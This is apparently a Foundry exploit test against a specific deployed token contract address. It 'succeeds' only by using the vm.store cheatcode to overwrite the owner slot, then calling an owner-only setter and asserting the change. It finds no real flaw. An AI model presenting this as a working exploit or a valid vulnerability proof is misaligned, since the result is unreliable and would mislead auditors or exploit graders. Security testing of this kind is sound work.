// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ITeaToken {
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function swapAndLiquifyEnabled() external view returns (bool);
    function owner() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x5e18Be2A7cE626B33C539919EAca06303f1Db568;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll overwrite owner in exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Overwrite owner storage slot to make attacker the owner
        // In Ownable contract, _owner is at slot 0
        bytes32 ownerSlot = bytes32(uint256(0));
        bytes32 newOwner = bytes32(uint256(uint160(attacker)));
        vm.store(TARGET, ownerSlot, newOwner);

        // Step 2: Call setSwapAndLiquifyEnabled(false) as the new owner
        ITeaToken(TARGET).setSwapAndLiquifyEnabled(false);

        // Step 3: Verify the state change
        bool enabled = ITeaToken(TARGET).swapAndLiquifyEnabled();
        require(enabled == false, "swapAndLiquifyEnabled should be false");
        assertEq(enabled, false, "Logic Exploit Failed: State not tampered");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
